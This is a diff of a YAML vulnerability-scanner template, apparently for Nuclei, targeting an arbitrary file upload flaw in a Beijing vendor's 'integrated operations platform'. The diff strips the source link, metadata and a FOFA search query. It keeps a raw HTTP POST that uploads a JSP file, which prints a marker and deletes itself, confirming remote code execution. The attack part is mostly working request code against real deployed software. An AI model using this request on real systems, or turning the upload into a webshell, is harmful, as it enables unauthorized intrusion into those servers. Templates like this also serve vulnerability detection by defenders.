@@ -3,12 +3,8 @@ info:
   name: 北京中科聚网一体化运营平台 resources 任意文件上传
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mmpeq7uaded2qs6k'
+  description: ''
   tags: rce,file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: mmpeq7uaded2qs6k
-    fofa: title="一体化运营平台" || body="thirdparty/ueditor/WordPaster"
 http:
 - raw:
   - 'POST /resources/files/ue/word HTTP/1.1
@@ -29,8 +25,6 @@ http:
     Accept-Language: en-US;q=0.9,en;q=0.8
 
 
-
-
     ------6fjhygvfu78fhvghkvr7842oibuvbiu
 
 
@@ -38,8 +32,6 @@ http:
 
 
     Content-Type: application/octet-stream
-
-
 
 
     <% out.println("DudeSuite");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
